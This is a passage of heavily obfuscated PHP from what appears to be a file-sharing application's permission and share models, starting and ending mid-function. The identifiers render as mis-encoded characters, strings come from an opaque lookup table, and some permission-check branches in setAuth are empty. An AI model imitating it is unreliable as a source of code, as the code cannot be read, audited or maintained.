in_array($¬èœ•Å[$êÄƒ³®Ú[33]], array($êÄƒ³®Ú[88], $êÄƒ³®Ú[437], $êÄƒ³®Ú[2035], $êÄƒ³®Ú[2036], $êÄƒ³®Ú[2037]))) { $‘íÈ´ƒß[$êÄƒ³®Ú[33]] = $¬èœ•Å[$êÄƒ³®Ú[33]]; } if (isset($¬èœ•Å[$êÄƒ³®Ú[748]]) && in_array($¬èœ•Å[$êÄƒ³®Ú[748]], array($êÄƒ³®Ú[198], $êÄƒ³®Ú[88], $êÄƒ³®Ú[437], $êÄƒ³®Ú[2035]))) { $‘íÈ´ƒß[$êÄƒ³®Ú[748]] = $¬èœ•Å[$êÄƒ³®Ú[748]]; } $¼ØÛ„ß™ = Input::get($êÄƒ³®Ú[458], $êÄƒ³®Ú[7], $êÄƒ³®Ú[2034], array($êÄƒ³®Ú[1952], $êÄƒ³®Ú[452])); $Ë½¯°ä³ = array($êÄƒ³®Ú[450] => $êÄƒ³®Ú[451], $êÄƒ³®Ú[452] => $êÄƒ³®Ú[453]); $ã¬ÕÈµù = $êÄƒ³®Ú[2038] . $Ë½¯°ä³[$¼ØÛ„ß™]; $¢ßÆÇ¶å = Model($êÄƒ³®Ú[2030])->where($‘íÈ´ƒß)->order($ã¬ÕÈµù)->selectPage(20); if (empty($¢ßÆÇ¶å[$êÄƒ³®Ú[369]])) { return array(); } $Óïø½éŞ = array_to_keyvalue_group($¢ßÆÇ¶å[$êÄƒ³®Ú[369]], $êÄƒ³®Ú[748], $êÄƒ³®Ú[593]); if (!empty($Óïø½éŞ[0])) { $¬èœ•Å = $Óïø½éŞ[0]; $‘íÈ´ƒß = array($êÄƒ³®Ú[593] => array($êÄƒ³®Ú[7], $¬èœ•Å)); $•ß×ú¦ú = $this->where($‘íÈ´ƒß)->field($êÄƒ³®Ú[593])->select(); $•ß×ú¦ú = array_to_keyvalue($•ß×ú¦ú, $êÄƒ³®Ú[12], $êÄƒ³®Ú[593]); $Æáì¥ù‡ = array_diff($¬èœ•Å, $•ß×ú¦ú); if (!empty($Æáì¥ù‡)) { foreach ($¢ßÆÇ¶å[$êÄƒ³®Ú[369]] as $˜áééèã => $ö‘Â‚¯œ) { if (in_array($ö‘Â‚¯œ[$êÄƒ³®Ú[593]], $Æáì¥ù‡)) { unset($¢ßÆÇ¶å[$êÄƒ³®Ú[369]][$˜áééèã]); } } } } $this->_listDataApply($¢ßÆÇ¶å[$êÄƒ³®Ú[369]]); return $¢ßÆÇ¶å; } public function reportStatus($´½É°Éü) { $úŒ¥àÆ¯ =& $_SERVER[Îûáû“ş]; $âù¶ü¾¸ = array($úŒ¥àÆ¯[399] => $´½É°Éü[$úŒ¥àÆ¯[399]]); $Ú±¶Ô = Model($úŒ¥àÆ¯[2030])->where($âù¶ü¾¸)->field($úŒ¥àÆ¯[2039])->find(); if (!$Ú±¶Ô) { return !1; } $‚ çâÂ­ = array($úŒ¥àÆ¯[748] => $´½É°Éü[$úŒ¥àÆ¯[748]]); if ($´½É°Éü[$úŒ¥àÆ¯[748]] == $úŒ¥àÆ¯[2035] && $Ú±¶Ô[$úŒ¥àÆ¯[748]] == $úŒ¥àÆ¯[2035]) { $‚ çâÂ­[$úŒ¥àÆ¯[748]] = 0; } $”Ü¿ßŸ = Model($úŒ¥àÆ¯[2030])->where($âù¶ü¾¸)->save($‚ çâÂ­); if ($´½É°Éü[$úŒ¥àÆ¯[748]] == $úŒ¥àÆ¯[437]) { if ($Ú±¶Ô[$úŒ¥àÆ¯[468]] != $úŒ¥àÆ¯[198] && $this->shareFileMeta($Ú±¶Ô[$úŒ¥àÆ¯[468]])) { $this->shareFileMeta($Ú±¶Ô[$úŒ¥àÆ¯[468]], 0); } $this->remove($Ú±¶Ô[$úŒ¥àÆ¯[593]]); return !0; } if ($”Ü¿ßŸ && $´½É°Éü[$úŒ¥àÆ¯[748]] == $úŒ¥àÆ¯[2035]) { $àù¨ŠàÈ = $‚ çâÂ­[$úŒ¥àÆ¯[748]] == $úŒ¥àÆ¯[2035] ? 1 : 0; $this->shareFileMeta($Ú±¶Ô[$úŒ¥àÆ¯[468]], $àù¨ŠàÈ); $this->removeByFile($Ú±¶Ô[$úŒ¥àÆ¯[468]]); } return $”Ü¿ßŸ; } private function removeByFile($àªÂº°») { $ Ò÷³¼æ =& $_SERVER[Îûáû“ş]; $¶¶í¡Ÿ‘ = Model($ Ò÷³¼æ[824])->where(array($ Ò÷³¼æ[468] => $àªÂº°»))->field($ Ò÷³¼æ[402])->select(); $¦…šîÄ¢ = array_to_keyvalue($¶¶í¡Ÿ‘, $ Ò÷³¼æ[12], $ Ò÷³¼æ[402]); $×ó»ìÏ† = array($ Ò÷³¼æ[402] => array($ Ò÷³¼æ[7], $¦…šîÄ¢), $ Ò÷³¼æ[488] => 1); $¶¶í¡Ÿ‘ = $this->where($×ó»ìÏ†)->field($ Ò÷³¼æ[593])->select(); if (empty($¶¶í¡Ÿ‘)) { return; } $¿ÜñÆª¶ = array_to_keyvalue($¶¶í¡Ÿ‘, $ Ò÷³¼æ[12], $ Ò÷³¼æ[593]); $this->remove($¿ÜñÆª¶); } private function shareFileMeta($ºıéæ°ï, $‡ê¢êßù = null) { $œèÔ´¦ =& $_SERVER[Îûáû“ş]; $šŒœ•¼– = array($œèÔ´¦[468] => $ºıéæ°ï, $œèÔ´¦[94] => $œèÔ´¦[2040]); if (is_null($‡ê¢êßù)) { return Model($œèÔ´¦[2041])->where($šŒœ•¼–)->find(); } $šŒœ•¼–[$œèÔ´¦[374]] = $‡ê¢êßù; Model($œèÔ´¦[2041])->add($šŒœ•¼–, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\x75\162\x63\145\x5f\141\x75\x74\150"; public function getAuth($€òúÖ”) { $ô…Ú³™ª =& $_SERVER[Îûáû“ş]; $’ÂıäĞ€ = $this->sourceAuthSelect($€òúÖ”); $š·‡ŒÂ = array(); $ÅøŒ•ô‹ = array(); $‚ŒŸëÛ‚ = 2 << 25; foreach ($’ÂıäĞ€ as $£È‰ã®ö) { $¯ñµëË² = Model($ô…Ú³™ª[498])->listData($£È‰ã®ö[$ô…Ú³™ª[1965]]); if (!$¯ñµëË²) { continue; } $š·‡ŒÂ[] = $£È‰ã®ö; $³“»¸£ = 0; if ($£È‰ã®ö[$ô…Ú³™ª[411]] == SourceModel::TYPE_GROUP) { $³“»¸£ = $‚ŒŸëÛ‚ * 2; } if ($£È‰ã®ö[$ô…Ú³™ª[411]] == SourceModel::TYPE_USER) { $³“»¸£ = $‚ŒŸëÛ‚; } if ($£È‰ã®ö[$ô…Ú³™ª[411]] == SourceModel::TYPE_USER && $£È‰ã®ö[$ô…Ú³™ª[496]] == $ô…Ú³™ª[198]) { $³“»¸£ = 0; } $ÅøŒ•ô‹[] = $¯ñµëË²[$ô…Ú³™ª[413]] + $³“»¸£; } array_multisort($ÅøŒ•ô‹, SORT_DESC, $š·‡ŒÂ); return $š·‡ŒÂ; } public function sourceAuthSelect($ØÅ¾©ó·) { $§‰Ìºì =& $_SERVER[Îûáû“ş]; static $ÉÇûŞ›Ş = array(); $”í×¼™ = is_array($ØÅ¾©ó·) ? !1 : !0; if ($”í×¼™) { $ØÅ¾©ó· = array($ØÅ¾©ó·); } $±á£üüü = array(); foreach ($ØÅ¾©ó· as $ö“İ­Ù•) { if (isset($ÉÇûŞ›Ş[$ö“İ­Ù•])) { $±á£üüü[$ö“İ­Ù•] = $ÉÇûŞ›Ş[$ö“İ­Ù•]; } } if (count($±á£üüü) == count($ØÅ¾©ó·)) { return $”í×¼™ ? $±á£üüü[$ØÅ¾©ó·[0]] : $±á£üüü; } $ÜÛÌ¬È = $§‰Ìºì[2042]; $ê™™ğŸ = array($§‰Ìºì[402] => array($§‰Ìºì[7], $ØÅ¾©ó·)); $Ó®ù¨Öœ = $this->field($ÜÛÌ¬È)->order($§‰Ìºì[399])->where($ê™™ğŸ)->select(); $‹¼Ø±… = array_to_keyvalue_group($Ó®ù¨Öœ, $§‰Ìºì[402]); foreach ($ØÅ¾©ó· as $ö“İ­Ù•) { $ÉÇûŞ›Ş[$ö“İ­Ù•] = $‹¼Ø±…[$ö“İ­Ù•] ? $‹¼Ø±…[$ö“İ­Ù•] : array(); } if ($”í×¼™) { return $Ó®ù¨Öœ; } return $‹¼Ø±…; } public function setAuth($—ã¡Ä©î, $°“˜ºİ‹) { $‘Ëäß…’ =& $_SERVER[Îûáû“ş]; $øÑÓáçÖ = Model($‘Ëäß…’[1341])->sourceInfo($—ã¡Ä©î); if (!$øÑÓáçÖ) { return !1; } if ($øÑÓáçÖ[$‘Ëäß…’[411]] != SourceModel::TYPE_GROUP) { return !1; } $¦€¸ã´ = 1; $ÜÑ±çÀŠ = $øÑÓáçÖ[$‘Ëäß…’[496]]; if ($ÜÑ±çÀŠ != $¦€¸ã´) { $¨¤Æ„ó = array($‘Ëäß…’[1861] => $ÜÑ±çÀŠ); $ˆ»áóŸ = Model($‘Ëäß…’[1951])->field($‘Ëäß…’[1670])->where($¨¤Æ„ó)->select(); $ˆ»áóŸ = array_to_keyvalue($ˆ»áóŸ, $‘Ëäß…’[12], $‘Ëäß…’[1670]); } $½èòÊñŞ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ú•ôØò¥ = array(); foreach ($°“˜ºİ‹ as $Şåë’œ¼) { if (!in_array($Şåë’œ¼[$‘Ëäß…’[411]], $½èòÊñŞ)) { show_json(LNG($‘Ëäß…’[2043]), !1); } if ($ÜÑ±çÀŠ != $¦€¸ã´) { if ($Şåë’œ¼[$‘Ëäß…’[411]] == SourceModel::TYPE_GROUP) { } if ($Şåë’œ¼[$‘Ëäß…’[496]] != 0 && !in_array($Şåë’œ¼[$‘Ëäß…’[496]], $ˆ»áóŸ)) { } } if ($Şåë’œ¼[$‘Ëäß…’[496]] == 0) { $Şåë’œ¼[$‘Ëäß…’[411]] = SourceModel::TYPE_USER; } $ú•ôØò¥[] = array($‘Ëäß…’[402] => $—ã¡Ä©î, $‘Ëäß…’[411] => intval($Şåë’œ¼[$‘Ëäß…’[411]]), $‘Ëäß…’[496] => intval($Şåë’œ¼[$‘Ëäß…’[496]]), $‘Ëäß…’[1965] => intval($Şåë’œ¼[$‘Ëäß…’[1965]]) ? intval($Şåë’œ¼[$‘Ëäß…’[1965]]) : 0, $‘Ëäß…’[2025] => intval($Şåë’œ¼[$‘Ëäß…’[2025]]) ? intval($Şåë’œ¼[$‘Ëäß…’[2025]]) : -1); } $this->where(array($‘Ëäß…’[417] => $—ã¡Ä©î))->delete(); $this->addAll($ú•ôØò¥); return !0; } public function authClear($ğ¨Ä¦¼‘) { $ï´ŠÕĞ =& $_SERVER[Îûáû“ş]; $à¹¸°“¡ = Model($ï´ŠÕĞ[1341])->sourceInfo($ğ¨Ä¦¼‘); $²¸×î›å = array($ğ¨Ä¦¼‘); if ($à¹¸°“¡[$ï´ŠÕĞ[410]] == $ï´ŠÕĞ[88]) { $ßÁˆ—ŠÂ = array($ï´ŠÕĞ[580] => array($ï´ŠÕĞ[540], $à¹¸°“¡[$ï´ŠÕĞ[511]] . $ğ¨Ä¦¼‘ . $ï´ŠÕĞ[541])); $²¸×î›å = Model($ï´ŠÕĞ[1341])->field($ï´ŠÕĞ[417])->where($ßÁˆ—ŠÂ)->getField($ï´ŠÕĞ[402], !0); $²¸×î›å[] = $ğ¨Ä¦¼‘; } $this->where(array($ï´ŠÕĞ[417] => array($ï´ŠÕĞ[418], $²¸×î›å)))->delete(); return !0; } public function getAllChildren($Êø«è‡ ) { $¦Ğ²Í¸ =& $_SERVER[Îûáû“ş]; $«Òí±™ = Model($¦Ğ²Í¸[1341])->sourceInfo($Êø«è‡ ); if ($«Òí±™[$¦Ğ²Í¸[410]] != $¦Ğ²Í¸[88]) { return $this->sourceListAuth(array($Êø«è‡ )); } if ($«Òí±™[$¦Ğ²Í¸[411]] != SourceModel::TYPE_GROUP) { return array(); } $ÈÏ¾ğ’è = 1; $ÊÒÀ‰íƒ = array($Êø«è‡ ); if ($«Òí±™[$¦Ğ²Í¸[432]] == $¦Ğ²Í¸[198] && $«Òí±™[$¦Ğ²Í¸[496]] != $ÈÏ¾ğ’è) { $ÊÒÀ‰íƒ = $this->groupChidldAllRootSource($«Òí±™[$¦Ğ²Í¸[496]]); } $€“ëØÒ = $this->field($¦Ğ²Í¸[402])->group($¦Ğ²Í¸[402])->select(); $€“ëØÒ = array_to_keyvalue($€“ëØÒ, $¦Ğ²Í¸[12], $¦Ğ²Í¸[402]); if (!$€“ëØÒ) { return array(); } $‘ù¶úóğ = $¦Ğ²Í¸[2044]; $äó½¨• = array($¦Ğ²Í¸[402] => array($¦Ğ²Í¸[7], $€“ëØÒ), $¦Ğ²Í¸[431] => $¦Ğ²Í¸[198]); $Ğ°ùß…Ì = Model($¦Ğ²Í¸[824])->field($‘ù¶úóğ)->where($äó½¨•)->select(); $¹†®»€î = array($Êø«è‡ ); foreach ($Ğ°ùß…Ì as $áêï¢ÙÁ) { foreach ($ÊÒÀ‰íƒ as $şùş¦›‘) { $¾õš‘¿Î = $¦Ğ²Í¸[50] . $şùş¦›‘ . $¦Ğ²Í¸[50]; $‘Šï„Ş = $áêï¢ÙÁ[$¦Ğ²Í¸[511]] . $áêï¢ÙÁ[$¦Ğ²Í¸[402]] . $¦Ğ²Í¸[50]; if (strstr($‘Šï„Ş, $¾õš‘¿Î)) { $¹†®»€î[] = $áêï¢ÙÁ[$¦Ğ²Í¸[402]]; break; } } } return $this->sourceListAuth($¹†®»€î); } private function sourceListAuth($¦Ê“ûƒ°) { $˜ËíîêĞ =& $_SERVER[Îûáû“ş]; $Ä¾¼ã—æ = Model($˜ËíîêĞ[1341])->sourceListInfo($¦Ê“ûƒ°, !0); $òÆÄƒ¿Â = $this->sourceAuthSelect($¦Ê“ûƒ°); $ƒ®°Ö˜° = array(); $ÙôÊî• = array(); foreach ($Ä¾¼ã—æ as $‰Î¶áç) { unset($‰Î¶áç[$˜ËíîêĞ[456]]); unset($‰Î¶áç[$˜ËíîêĞ[454]]); unset($‰Î¶áç[$˜ËíîêĞ[413]]); unset($‰Î¶áç[$˜ËíîêĞ[87]]); $êö®ù¯• = $òÆÄƒ¿Â[$‰Î¶áç[$˜ËíîêĞ[402]]]; if (!$êö®ù¯•) { continue; } $‰Î¶áç[$˜ËíîêĞ[2045]] = $this->authTargetInfo($êö®ù¯•); $‰Î¶áç[$˜ËíîêĞ[509]] = rtrim($‰Î¶áç[$˜ËíîêĞ[515]], $˜ËíîêĞ[8]) . $˜ËíîêĞ[8] . ltrim($‰Î¶áç[$˜ËíîêĞ[509]], $˜ËíîêĞ[8]); $ƒ®°Ö˜°[] = $‰Î¶áç; $Š§ÎÉ•ó = count(explode($˜ËíîêĞ[8], trim($‰Î¶áç[$˜ËíîêĞ[509]], $˜ËíîêĞ[8]))); $ÙôÊî•[] = $Š§ÎÉ•ó + ($‰Î¶áç[$˜ËíîêĞ[33]] == $˜ËíîêĞ[75] ? 0 : 1000); } array_multisort($ÙôÊî•, SORT_ASC, $ƒ®°Ö˜°); return $ƒ®°Ö˜°; } private function groupChidldAllRootSource($ôıÀ‚¯Ÿ) { $ñ­ş¡Ù =& $_SERVER[Îûáû“ş]; $Ÿè‰ĞÀ® = Model($ñ­ş¡Ù[2046])->groupChildrenAll($ôıÀ‚¯Ÿ); $½Œ¶ìğ = array($ñ­ş¡Ù[432] => 0, $ñ­ş¡Ù[496] => array($ñ­ş¡Ù[7], $Ÿè‰ĞÀ®), $ñ­ş¡Ù[411] => SourceModel::TYPE_GROUP); $õÖ‡¡¦› = Model($ñ­ş¡Ù[824])->field($ñ­ş¡Ù[402])->where($½Œ¶ìğ)->select(); $õÖ‡¡¦› = array_to_keyvalue($õÖ‡¡¦›, $ñ­ş¡Ù[12], $ñ­ş¡Ù[402]); return $õÖ‡¡¦›; } private function authTargetInfo($ï°¢°­‡) { $ĞİÖı™î =& $_SERVER[Îûáû“ş]; $ƒİş¶´ = array(); $“§ÊÓ˜É = array(); $äÍ™†µ = 2 << 25; foreach ($ï°¢°­‡ as $â¢Á—êÄ) { $éÒõ½âœ = Model($ĞİÖı™î[498])->listData($â¢Á—êÄ[$ĞİÖı™î[1965]]); if (!$éÒõ½âœ) { continue; } if ($â¢Á—êÄ[$ĞİÖı™î[411]] == SourceModel::TYPE_USER) { $öĞšéØ© = Model($ĞİÖı™î[504])->getInfoSimpleOuter($â¢Á—êÄ[$ĞİÖı™î[496]]); if ($öĞšéØ©[$ĞİÖı™î[1670]] == $ĞİÖı™î[1190]) { continue; } if ($öĞšéØ©[$ĞİÖı™î[1670]] == $ĞİÖı™î[198]) { $öĞšéØ©[$ĞİÖı™î[32]] = LNG($ĞİÖı™î[2047]); } } else { $öĞšéØ© = Model($ĞİÖı™î[512])->getInfoSimple($â¢Á—êÄ[$ĞİÖı™î[496]]); } if (!$öĞšéØ©) { continue; } $öĞšéØ©[$ĞİÖı™î[467]] = $éÒõ½âœ; $ƒİş¶´[] = $öĞšéØ©; $¬ñª€¼ = 0; if ($â¢Á—êÄ[$ĞİÖı™î[411]] == SourceModel::TYPE_GROUP) { $¬ñª€¼ = $äÍ™†µ * 2; } if ($â¢Á—êÄ[$ĞİÖı™î[411]] == SourceModel::TYPE_USER) { $¬ñª€¼ = $äÍ™†µ; } if ($â¢Á—êÄ[$ĞİÖı™î[411]] == SourceModel::TYPE_USER && $â¢Á—êÄ[$ĞİÖı™î[496]] == $ĞİÖı™î[198]) { $¬ñª€¼ = 0; } $“§ÊÓ˜É[] = $éÒõ½âœ[$ĞİÖı™î[413]] + $¬ñª€¼; } array_multisort($“§ÊÓ˜É, SORT_DESC, $ƒİş¶´); return $ƒİş¶´; } public function getAllChildrenByUser($Â âÈ, $·ÓäÂ¦è) { $¼ƒ…À² =& $_SERVER[Îûáû“ş]; $¡ÃÊ«­ã = Model($¼ƒ…À²[525])->getInfo($·ÓäÂ¦è); if (!$·ÓäÂ¦è || !$Â âÈ || !$¡ÃÊ«­ã) { return array(); } $ø²Ö‰àª = Model($¼ƒ…À²[1341])->sourceInfo($Â âÈ); $Ï€ª…Èç = array(); $²š±ä† = 1; if ($ø²Ö‰àª[$¼ƒ…À²[432]] == $¼ƒ…À²[198] && $ø²Ö‰àª[$¼ƒ…À²[496]] != $²š±ä† && $this->groupContainUser($ø²Ö‰àª[$¼ƒ…À²[496]], $·ÓäÂ¦è)) { foreach ($¡ÃÊ«­ã[$¼ƒ…À²[2048]] as $¤ïú†ª‹) { $‚Ÿ©œœ„ = Model($¼ƒ…À²[512])->getInfo($¤ïú†ª‹[$¼ƒ…À²[1861]]); $¬°ÎÙÀè = Model($¼ƒ…À²[525])->getInfoSimpleOuter($·ÓäÂ¦è); $¬°ÎÙÀè[$¼ƒ…À²[467]] = $¤ïú†ª‹[$¼ƒ…À²[413]]; if (Model($¼ƒ…À²[498])->authCheckAction($¤ïú†ª‹[$¼ƒ…À²[413]][$¼ƒ…À²[413]], $¼ƒ…À²[1882])) { continue; } $ÔŞ…‹ = array($¼ƒ…À²[32] => $¼ƒ…À²[1210] . $‚Ÿ©œœ„[$¼ƒ…À²[32]], $¼ƒ…À²[402] => $‚Ÿ©œœ„[$¼ƒ…À²[87]][$¼ƒ…À²[402]], $¼ƒ…À²[84] => KodIO::make($‚Ÿ©œœ„[$¼ƒ…À²[87]][$¼ƒ…À²[402]]), $¼ƒ…À²[432] => $¼ƒ…À²[198], $¼ƒ…À²[411] => $¼ƒ…À²[505], $¼ƒ…À²[33] => $¼ƒ…À²[544], $¼ƒ…À²[509] => $‚Ÿ©œœ„[$¼ƒ…À²[516]], $¼ƒ…À²[1861] => $‚Ÿ©œœ„[$¼ƒ…À²[1861]], $¼ƒ…À²[513] => $‚Ÿ©œœ„[$¼ƒ…À²[432]], $¼ƒ…À²[2045] => array($¬°ÎÙÀè)); $Ï€ª…Èç[$ÔŞ…‹[$¼ƒ…À²[402]]] = $ÔŞ…‹; } } $õ—©–õ² = array(); $ıÍ€²ïí = $this->getAllChildren($Â âÈ); foreach ($ıÍ€²ïí as $…ÆÀášâ) { $”÷À£ç‘ = !1; foreach ($…ÆÀášâ[$¼ƒ…À²[2045]] as $ÖªÈñãÏ) { if ($ÖªÈñãÏ[$¼ƒ…À²[1670]]) { if ($ÖªÈñãÏ[$¼ƒ…À²[1670]] == $·ÓäÂ¦è) { $”÷À£ç‘ = !0; break; } } if ($ÖªÈñãÏ[$¼ƒ…À²[1861]]) { if ($this->groupContainUser($ÖªÈñãÏ[$¼ƒ…À²[1861]], $·ÓäÂ¦è)) { $”÷À£ç‘ = !0; break; } } } if ($”÷À£ç‘) { $õ—©–õ²[] = $…ÆÀášâ; } $­¸Å°ÎĞ = $…ÆÀášâ[$¼ƒ…À²[402]]; if (isset($Ï€ª…Èç[$­¸Å°ÎĞ])) { $…ÆÀášâ[$¼ƒ…À²[2045]][] = $Ï€ª…Èç[$­¸Å°ÎĞ][0]; $Ï€ª…Èç[$­¸Å°ÎĞ] = !1; } } $Ï€ª…Èç = array_filter(array_values($Ï€ª…Èç)); $õ—©–õ² = array_merge($Ï€ª…Èç, $õ—©–õ²); return $õ—©–õ²; } public function setAllChildrenByUser($¿Œ¤Ü©Ô, $ºÙµ¥°, $’óşû˜) { $Ê«×­Ã¦ =& $_SERVER[Îûáû“ş]; $‚ÂÒ¥ü— = $this->getAllChildrenByUser($¿Œ¤Ü©Ô, $ºÙµ¥°); if (!$’óşû˜ || !$‚ÂÒ¥ü—) { return !1; } foreach ($‚ÂÒ¥ü— as $Ş±¢ƒâü) { $ÜÌÂ®ˆ½ = array(); foreach ($Ş±¢ƒâü[$Ê«×­Ã¦[2045]] as $ˆ¤ĞÉ Ø) { $íïæş• = $ˆ¤ĞÉ Ø[$Ê«×­Ã¦[467]]; $Âôçêâ¶ = $ˆ¤ĞÉ Ø[$Ê«×­Ã¦[1670]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $‡‚‡äåƒ = $ˆ¤ĞÉ Ø[$Ê«×­Ã¦[1670]] ? $ˆ¤ĞÉ Ø[$Ê«×­Ã¦[1670]] : $ˆ¤ĞÉ Ø[$Ê«×­Ã¦[1861]]; if ($ˆ¤ĞÉ Ø[$Ê«×­Ã¦[1670]] && $ˆ¤ĞÉ Ø[$Ê«×­Ã¦[1670]] == $ºÙµ¥°) { continue; } $ÜÌÂ®ˆ½[] = array($Ê«×­Ã¦[402] => $Ş±¢ƒâü[$Ê«×­Ã¦[402]], $Ê«×­Ã¦[411] => $Âôçêâ¶, $Ê«×­Ã¦[496] => intval($‡‚‡äåƒ), $Ê«×­Ã¦[1965] => isset($íïæş•[$Ê«×­Ã¦[399]]) ? intval($íïæş•[$Ê«×­Ã¦[399]]) : 0, $Ê«×­Ã¦[2025] => isset($íïæş•[$Ê«×­Ã¦[2025]]) ? intval($íïæş•[$Ê«×­Ã¦[2025]]) : -1); } $ÜÌÂ®ˆ½[] = array($Ê«×­Ã¦[402] => $Ş±¢ƒâü[$Ê«×­Ã¦[402]], $Ê«×­Ã¦[411] => SourceModel::TYPE_USER, $Ê«×­Ã¦[496] => intval($ºÙµ¥°), $Ê«×­Ã¦[1965] => intval($’óşû˜), $Ê«×­Ã¦[2025] => -1); $this->where(array($Ê«×­Ã¦[417] => $Ş±¢ƒâü[$Ê«×­Ã¦[402]]))->delete(); $this->addAll($ÜÌÂ®ˆ½); } return !0; } public function get($ÉñĞ óÇ) { $Ü¨üõ® = $this->getSourceList(array($ÉñĞ óÇ), !0); return $Ü¨üõ®[0]; } public function getSourceList($€ÇÄÚ÷², $Ô¨ã€ş² = false, $äú§¨× = false) { $Ã†©ËÚÀ =& $_SERVER[Îûáû“ş]; if (!$€ÇÄÚ÷²) { return array(); } $Àª©Â™æ = Model($Ã†©ËÚÀ[1341]); if (!$Ô¨ã€ş² && count($€ÇÄÚ÷²) == 1) { $Ô¨ã€ş² = array(); $Ô¨ã€ş²[$€ÇÄÚ÷²[0]] = $Àª©Â™æ->sourceInfo($€ÇÄÚ÷²[0]); } if (!$Ô¨ã€ş²) { $âù ËÊô = array($Ã†©ËÚÀ[417] => array($Ã†©ËÚÀ[418], $€ÇÄÚ÷²)); $Ô¨ã€ş² = $Àª©Â™æ->field($Ã†©ËÚÀ[2049])->where($âù ËÊô)->select(); $Ô¨ã€ş² = array_to_keyvalue($Ô¨ã€ş², $Ã†©ËÚÀ[402]); } $Ôß´¢“é = $€ÇÄÚ÷²; foreach ($Ô¨ã€ş² as $¡á•™‹ => $ú¯ëò­Ó) { $æÉ•š  = $Àª©Â™æ->parentLevelArray($ú¯ëò­Ó[$Ã†©ËÚÀ[511]]); $Ôß´¢“é = array_merge($Ôß´¢“é, array($¡á•™‹), array_reverse($æÉ•š )); } $Ôß´¢“é = array_values(array_unique($Ôß´¢“é)); if (!$Ôß´¢“é) { return array(); } $Í‹Äş¶— = $this->sourceAuthSelect($Ôß´¢“é); $›ò›äÅ– = array(); foreach ($Ôß´¢“é as $Ã¸óÖ¶•) { if (isset($Í‹Äş¶—[$Ã¸óÖ¶•])) { $›ò›äÅ–[$Ã¸óÖ¶•] = $Í‹Äş¶—[$Ã¸óÖ¶•]; } } $úŞÖÃÅ = $this->userIsRoot($äú§¨×); $¿¹óé‘¡ = AuthModel::authAll(); $ƒùà„æó = array($Ã†©ËÚÀ[414] => $¿¹óé‘¡, $Ã†©ËÚÀ[2050] => array($Ã†©ËÚÀ[419] => 0, $Ã†©ËÚÀ[1867] => $¿¹óé‘¡, $Ã†©ËÚÀ[420] => LNG($Ã†©ËÚÀ[2051]), $Ã†©ËÚÀ[1884] => $Ã†©ËÚÀ[2052])); $ñúï°¶† = array(); foreach ($Ô¨ã€ş² as $Ã¸óÖ¶• => $¢†«‰…«) { if ($úŞÖÃÅ && $GLOBALS[$Ã†©ËÚÀ[6]][$Ã†©ËÚÀ[1880]]) { $ñúï°¶†[$Ã¸óÖ¶•] = $ƒùà„æó; continue; } $ñúï°¶†[$Ã¸óÖ¶•] = $this->makeSourceAuth($¢†«‰…«, $›ò›äÅ–, $äú§¨×); } return $ñúï°¶†; } public function authDeepCheck($ÍìçÕÄ, $ğàË¨º = false) { $Òã¾—ö¿ =& $_SERVER[Îûáû“ş]; $ğàË¨º = $ğàË¨º ? $ğàË¨º : USER_ID; $œ—õÀ” = $this->makeAuthDeep($ğàË¨º); if (!in_array($ÍìçÕÄ, $œ—õÀ”[$Òã¾—ö¿[2053]])) { return !1; } $ì‚ØÆÆ˜ = array(); foreach ($œ—õÀ”[$Òã¾—ö¿[2054]] as $ù¶²ÔÂÌ => $ ÅÕ„›è) { if (!in_array($ÍìçÕÄ, $ ÅÕ„›è)) { continue; } $ì‚ØÆÆ˜[] = $ù¶²ÔÂÌ; } if (!$ì‚ØÆÆ˜) { return !1; } $…ªû¨§» = $ì‚ØÆÆ˜ ? $ì‚ØÆÆ˜[0] : $ÍìçÕÄ; return array($Òã¾—ö¿[414] => -1, $Òã¾—ö¿[467] => array($Òã¾—ö¿[419] => $Òã¾—ö¿[1190], $Òã¾—ö¿[1867] => $Òã¾—ö¿[198], $Òã¾—ö¿[420] => LNG($Òã¾—ö¿[2055]), $Òã¾—ö¿[1884] => $Òã¾—ö¿[2056]), $Òã¾—ö¿[2057] => LNG($Òã¾—ö¿[2058]), $Òã¾—ö¿[2059] => $this->sourceAuthInfo($…ªû¨§»)); } protected function makeAuthDeep($í¢Á¼Ôğ = false) { $êæ„ÊĞÀ =& $_SERVER[Îûáû“ş]; static $ÇÒ·Ù¦³ = array(); $í¢Á¼Ôğ = $í¢Á¼Ôğ ? $í¢Á¼Ôğ : USER_ID; if (isset($ÇÒ·Ù¦³[$í¢Á¼Ôğ])) { return $ÇÒ·Ù¦³[$í¢Á¼Ôğ]; } $éÇà¥‚ = Model($êæ„ÊĞÀ[2060])->listData(); $ÇĞÄ†‘Æ = array(); foreach ($éÇà¥‚ as $Š§ÌÚª½) { if ($Š§ÌÚª½[$êæ„ÊĞÀ[413]] == 0 && $Š§ÌÚª½[$êæ„ÊĞÀ[1883]] == $êæ„ÊĞÀ[88]) { $ÇĞÄ†‘Æ[] = $Š§ÌÚª½[$êæ„ÊĞÀ[399]]; } } $Ã³¿å¯” = $this->userGroupParents($í¢Á¼Ôğ); $ê¨ı²­” = array($êæ„ÊĞÀ[411] => SourceModel::TYPE_USER, $êæ„ÊĞÀ[496] => $í¢Á¼Ôğ); if ($Ã³¿å¯”) { $ê¨ı²­” = array(array($êæ„ÊĞÀ[411] => SourceModel::TYPE_USER, $êæ„ÊĞÀ[496] => $í¢Á¼Ôğ), array($êæ„ÊĞÀ[411] => SourceModel::TYPE_GROUP, $êæ„ÊĞÀ[496] => array($êæ„ÊĞÀ[418], $Ã³¿å¯”)), $êæ„ÊĞÀ[1002] => $êæ„ÊĞÀ[1959]); } $Ãú••Ëó = $this->field($êæ„ÊĞÀ[2061])->where($ê¨ı²­”)->select(); $‘Ìé³§ = array(); $‡ôšşö² = array_to_keyvalue_group($Ãú••Ëó, $êæ„ÊĞÀ[402]); foreach ($‡ôšşö² as $ÔĞ†åÂÖ => $ˆƒ·Ãäú) { $Èı™„·Ğ = $this->authArrayCheck($ˆƒ·Ãäú, $í¢Á¼Ôğ); if ($Èı™„·Ğ[$êæ„ÊĞÀ[414]] > 0) { $‘Ìé³§[] = $ÔĞ†åÂÖ . $êæ„ÊĞÀ[12]; } } if ($Ã³¿å¯”) { $¸Í‡ÁÏÜ = Model($êæ„ÊĞÀ[512]); foreach ($Ã³¿å¯” as $€‹¤èºë) { $é¨®™ê = $¸Í‡ÁÏÜ->getInfo($€‹¤èºë); if (!$é¨®™ê || 